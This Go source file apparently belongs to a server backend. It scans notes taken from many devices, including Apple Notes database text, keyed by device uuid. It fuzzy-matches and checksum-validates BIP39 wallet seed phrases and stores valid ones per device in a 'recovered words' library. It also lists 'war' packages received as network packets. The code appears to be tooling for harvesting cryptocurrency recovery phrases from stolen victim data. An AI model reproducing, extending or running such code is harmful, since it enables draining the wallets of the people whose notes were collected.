package store

import (
	"crypto/sha256"
	_ "embed"
	"strings"
	"sync"
)

// BIP39 助记词批量模糊匹配 + 校验 → 命中记录落表 memo_bip39。
//
// 流程：备忘录（title / snippet，含 NoteStore.sqlite 抽取的正文）→ 分词 → 滑动窗口
// (12/15/18/21/24) → 模糊命中（允许少量噪声词 + 编辑距离 1 纠正）→ BIP39 校验
// （词表 + 词数 + SHA256 校验位）→ UPSERT 进 memo_bip39。前端只读命中表，
// 不再全量堆砌 6~7 万条备忘录。

//go:embed bip39_english.txt
var bip39EnglishRaw string

var (
	bip39Index map[string]int // word -> 11bit index
	bip39Words []string       // 按 index 排列
)

func bip39Init() {
	if bip39Index != nil {
		return
	}
	lines := strings.Split(bip39EnglishRaw, "\n")
	bip39Words = make([]string, 0, 2048)
	for _, ln := range lines {
		w := strings.TrimSpace(ln)
		if w == "" {
			continue
		}
		bip39Words = append(bip39Words, w)
	}
	bip39Index = make(map[string]int, len(bip39Words))
	for i, w := range bip39Words {
		bip39Index[w] = i
	}
}

// BIP39WordCount 是否合法词数。
func BIP39WordCount(n int) bool {
	switch n {
	case 12, 15, 18, 21, 24:
		return true
	}
	return false
}

// BIP39Check 严格 BIP39 校验：全部词在词表内 + 词数合法 + 校验位匹配。
func BIP39Check(words []string) (bool, string) {
	bip39Init()
	if !BIP39WordCount(len(words)) {
		return false, "词数非法（需 12/15/18/21/24）"
	}
	totalBits := len(words) * 11
	csBits := totalBits / 33
	entBits := totalBits - csBits

	bits := make([]byte, totalBits)
	for i, w := range words {
		idx, ok := bip39Index[strings.ToLower(w)]
		if !ok {
			return false, "非词表词: " + w
		}
		for b := 0; b < 11; b++ {
			bits[i*11+b] = byte((idx >> (10 - b)) & 1)
		}
	}
	ent := make([]byte, entBits/8)
	for i := 0; i < entBits; i++ {
		if bits[i] == 1 {
			ent[i/8] |= 1 << (7 - uint(i%8))
		}
	}
	sum := sha256.Sum256(ent)
	for i := 0; i < csBits; i++ {
		want := (sum[i/8] >> (7 - uint(i%8))) & 1
		if bits[entBits+i] != want {
			return false, "校验位不匹配"
		}
	}
	return true, ""
}

// nearestBip39 编辑距离 1 的词表纠正（删除 / 替换 / 插入 变体查表，命中即返回）。
func nearestBip39(tok string) (string, bool) {
	bip39Init()
	if _, ok := bip39Index[tok]; ok {
		return tok, true
	}
	for i := 0; i < len(tok); i++ {
		if _, ok := bip39Index[tok[:i]+tok[i+1:]]; ok {
			return tok[:i] + tok[i+1:], true
		}
	}
	for i := 0; i < len(tok); i++ {
		for c := byte('a'); c <= 'z'; c++ {
			if c == tok[i] {
				continue
			}
			cand := tok[:i] + string(c) + tok[i+1:]
			if _, ok := bip39Index[cand]; ok {
				return cand, true
			}
		}
	}
	for i := 0; i <= len(tok); i++ {
		for c := byte('a'); c <= 'z'; c++ {
			cand := tok[:i] + string(c) + tok[i:]
			if _, ok := bip39Index[cand]; ok {
				return cand, true
			}
		}
	}
	return "", false
}

// tokenize 按非字母切分并转小写（助记词不含数字）。
func tokenize(s string) []string {
	var out []string
	var b strings.Builder
	flush := func() {
		if b.Len() > 0 {
			out = append(out, strings.ToLower(b.String()))
			b.Reset()
		}
	}
	for _, r := range s {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') {
			b.WriteRune(r)
			continue
		}
		flush()
	}
	flush()
	return out
}

// Bip39Hit 一条候选（未关联备忘录身份）。
type Bip39Hit struct {
	Phrase    string `json:"phrase"`
	Raw       string `json:"raw"`
	Words     int    `json:"words"`
	Valid     bool   `json:"valid"`
	Reason    string `json:"reason"`
	Corrected int    `json:"corrected"`
	Unknown   int    `json:"unknown"`
}

// extractBip39Candidates 从文本里提取助记词候选。
// 召回优先：窗口噪声容忍量按词数自适应（sz/4，至少 2），并对错拼词做距离 1 纠正；
// 只要命中达到阈值就产出候选（通过与否都产出，绝不因校验失败而丢弃）。
func extractBip39Candidates(text string) []Bip39Hit {
	bip39Init()
	toks := tokenize(text)
	n := len(toks)
	if n < 12 {
		return nil
	}
	var hits []Bip39Hit
	seen := map[string]bool{}
	for _, sz := range []int{24, 21, 18, 15, 12} {
		noise := sz / 4
		if noise < 2 {
			noise = 2
		}
		for i := 0; i+sz <= n; i++ {
			win := toks[i : i+sz]
			exact := 0
			for _, w := range win {
				if _, ok := bip39Index[w]; ok {
					exact++
				}
			}
			if exact < sz-noise {
				continue
			}
			corrected := make([]string, sz)
			fixed, unknown := 0, 0
			for j, w := range win {
				if _, ok := bip39Index[w]; ok {
					corrected[j] = w
					continue
				}
				if nw, ok := nearestBip39(w); ok {
					corrected[j] = nw
					fixed++
				} else {
					corrected[j] = w
					unknown++
				}
			}
			phrase := strings.Join(corrected, " ")
			if seen[phrase] {
				continue
			}
			seen[phrase] = true
			valid, reason := BIP39Check(corrected)
			hits = append(hits, Bip39Hit{
				Phrase: phrase, Raw: strings.Join(win, " "), Words: sz,
				Valid: valid, Reason: reason, Corrected: fixed, Unknown: unknown,
			})
		}
	}
	return hits
}

func b2i(b bool) int {
	if b {
		return 1
	}
	return 0
}

// RunMemoBip39Scan 全量扫描 memos（title + snippet），候选 UPSERT 进 memo_bip39。
// 幂等（唯一键 uuid+note_id+field+phrase 前缀），可重复触发。
func RunMemoBip39Scan() map[string]any {
	db := GetDB()
	if db == nil {
		return map[string]any{"scanned": 0, "candidates": 0, "valid": 0, "written": 0}
	}
	rows := db.Query("SELECT uuid, note_id, title, snippet FROM memos")
	ts, _ := Now()
	var args []SQLArgs
	cand, validN := 0, 0
	recByDev := map[string][]RecoveredWord{} // 有效助记词 → 自动进助记词库
	for _, r := range rows {
		uuid := toStr(r["uuid"])
		noteID := int64(toInt(r["note_id"]))
		for _, f := range []struct{ name, text string }{
			{"title", toStr(r["title"])},
			{"snippet", toStr(r["snippet"])},
		} {
			if f.text == "" {
				continue
			}
			for _, h := range extractBip39Candidates(f.text) {
				cand++
				if h.Valid {
					validN++
					recByDev[uuid] = append(recByDev[uuid], RecoveredWord{
						Phrase: h.Phrase, Words: h.Words, Valid: true, Crosscheck: "备忘录",
					})
				}
				args = append(args, SQLArgs{
					SQL: "INSERT INTO memo_bip39(uuid,note_id,field,phrase,raw,words,valid,reason,corrected,unknown,scanned_at)" +
						" VALUES(?,?,?,?,?,?,?,?,?,?,?)" +
						" ON DUPLICATE KEY UPDATE phrase=VALUES(phrase), raw=VALUES(raw), words=VALUES(words)," +
						" valid=VALUES(valid), reason=VALUES(reason), corrected=VALUES(corrected)," +
						" unknown=VALUES(unknown), scanned_at=VALUES(scanned_at)",
					Args: []any{uuid, noteID, f.name, h.Phrase, h.Raw, h.Words, b2i(h.Valid), h.Reason, h.Corrected, h.Unknown, ts},
				})
			}
		}
	}
	if len(args) > 0 {
		db.Many(args)
	}
	// 有效助记词自动入助记词库（去重由唯一键保证）。
	for u, items := range recByDev {
		SaveRecoveredWords(u, "memo", 0, items)
	}
	return map[string]any{"scanned": len(rows), "candidates": cand, "valid": validN, "written": len(args)}
}

// ── 手动触发：异步 + 单飞（不占用请求 / 不阻塞对外服务）──

var bip39Scan = struct {
	mu      sync.Mutex
	running bool
	started string
	done    string
	last    map[string]any
}{}

// StartMemoBip39Scan 触发后台全量扫描并立即返回；已有扫描在跑则不重复启动。
func StartMemoBip39Scan() map[string]any {
	bip39Scan.mu.Lock()
	if bip39Scan.running {
		st := bip39Scan.started
		bip39Scan.mu.Unlock()
		return map[string]any{"running": true, "started_at": st}
	}
	bip39Scan.running = true
	bip39Scan.started = nowStr()
	st := bip39Scan.started
	bip39Scan.mu.Unlock()

	go func() {
		res := RunMemoBip39Scan()
		bip39Scan.mu.Lock()
		bip39Scan.running = false
		bip39Scan.last = res
		bip39Scan.done = nowStr()
		bip39Scan.mu.Unlock()
	}()
	return map[string]any{"started": true, "started_at": st}
}

// MemoBip39ScanStatus 扫描状态（前端轮询用）。
func MemoBip39ScanStatus() map[string]any {
	bip39Scan.mu.Lock()
	defer bip39Scan.mu.Unlock()
	return map[string]any{
		"running": bip39Scan.running, "started_at": bip39Scan.started,
		"finished_at": bip39Scan.done, "last": bip39Scan.last,
	}
}

// QueryMemoBip39 读命中表（分页；onlyValid 只看校验通过）。
func QueryMemoBip39(page, per int, onlyValid bool) map[string]any {
	db := GetDB()
	if page < 1 {
		page = 1
	}
	if per < 1 || per > 500 {
		per = 50
	}
	where := ""
	if onlyValid {
		where = " WHERE valid=1"
	}
	total := 0
	if row := db.QueryOne("SELECT COUNT(*) n FROM memo_bip39" + where); row != nil {
		total = int(toInt(row["n"]))
	}
	rows := db.Query("SELECT uuid,note_id,field,phrase,raw,words,valid,reason,corrected,unknown,scanned_at"+
		" FROM memo_bip39"+where+
		" ORDER BY valid DESC, unknown ASC, words DESC, uuid ASC, note_id ASC LIMIT ? OFFSET ?",
		per, (page-1)*per)
	out := make([]map[string]any, 0, len(rows))
	for _, r := range rows {
		out = append(out, map[string]any{
			"uuid": toStr(r["uuid"]), "note_id": toInt(r["note_id"]), "field": toStr(r["field"]),
			"phrase": toStr(r["phrase"]), "raw": toStr(r["raw"]), "words": toInt(r["words"]),
			"valid": toInt(r["valid"]) == 1, "reason": toStr(r["reason"]),
			"corrected": toInt(r["corrected"]), "unknown": toInt(r["unknown"]),
			"scanned_at": toStr(r["scanned_at"]),
		})
	}
	return map[string]any{"rows": out, "total": total, "page": page, "per": per}
}

// ── BIP39 词表（落库，供前端「词表」模块）──

// SeedBip39Words 把内置 2048 词写入 bip39_words（幂等；仅当表内不足时补齐）。
func SeedBip39Words() int {
	bip39Init()
	db := GetDB()
	if db == nil {
		return 0
	}
	if row := db.QueryOne("SELECT COUNT(*) n FROM bip39_words"); row != nil && int(toInt(row["n"])) >= len(bip39Words) {
		return 0
	}
	args := make([]SQLArgs, 0, len(bip39Words))
	for i, w := range bip39Words {
		args = append(args, SQLArgs{
			SQL:  "INSERT INTO bip39_words(idx, word) VALUES(?,?) ON DUPLICATE KEY UPDATE word=VALUES(word)",
			Args: []any{i, w},
		})
	}
	db.Many(args)
	return len(args)
}

// ListBip39Words 词表检索（前缀/包含匹配；按 idx 升序）。
func ListBip39Words(kw string, page, per int) map[string]any {
	db := GetDB()
	if page < 1 {
		page = 1
	}
	if per < 1 || per > 500 {
		per = 100
	}
	where := ""
	var args []any
	if k := strings.TrimSpace(strings.ToLower(kw)); k != "" {
		where = " WHERE word LIKE ?"
		args = append(args, k+"%")
	}
	total := 0
	if row := db.QueryOne("SELECT COUNT(*) n FROM bip39_words"+where, args...); row != nil {
		total = int(toInt(row["n"]))
	}
	qargs := append(append([]any{}, args...), per, (page-1)*per)
	rows := db.Query("SELECT idx, word FROM bip39_words"+where+" ORDER BY idx LIMIT ? OFFSET ?", qargs...)
	out := make([]map[string]any, 0, len(rows))
	for _, r := range rows {
		out = append(out, map[string]any{"idx": toInt(r["idx"]), "word": toStr(r["word"])})
	}
	return map[string]any{"rows": out, "total": total, "page": page, "per": per}
}

// WarFileRow war 包文件（工具检测模块列表）。
type WarFileRow struct {
	PacketID int64  `json:"packet_id"`
	UUID     string `json:"uuid"`
	File     string `json:"file"`
	Size     int64  `json:"size"`
	TS       string `json:"ts"`
}

// ListWarFiles 列出已落盘的 war 包（按接收时间倒序，分页）。
func ListWarFiles(page, per int) map[string]any {
	db := GetDB()
	if page < 1 {
		page = 1
	}
	if per < 1 || per > 500 {
		per = 50
	}
	total := 0
	if row := db.QueryOne("SELECT COUNT(*) n FROM packets WHERE endpoint='war' AND file_path<>''"); row != nil {
		total = int(toInt(row["n"]))
	}
	rows := db.Query(`
        SELECT p.id, p.recv_ts, p.size, p.file_path,
               (SELECT m.value FROM packet_meta m
                 WHERE m.packet_id=p.id AND m.field IN ('lhu','device_uuid','uuid') AND m.value<>'' LIMIT 1) AS uuid
        FROM packets p
        WHERE p.endpoint='war' AND p.file_path<>''
        ORDER BY p.recv_epoch DESC LIMIT ? OFFSET ?`, per, (page-1)*per)
	out := make([]map[string]any, 0, len(rows))
	for _, r := range rows {
		fp := toStr(r["file_path"])
		base := fp
		if i := strings.LastIndex(fp, "/"); i >= 0 {
			base = fp[i+1:]
		}
		out = append(out, map[string]any{
			"packet_id": toInt(r["id"]), "uuid": toStr(r["uuid"]),
			"file": base, "size": toInt(r["size"]), "ts": toStr(r["recv_ts"]),
		})
	}
	return map[string]any{"rows": out, "total": total, "page": page, "per": per}
}
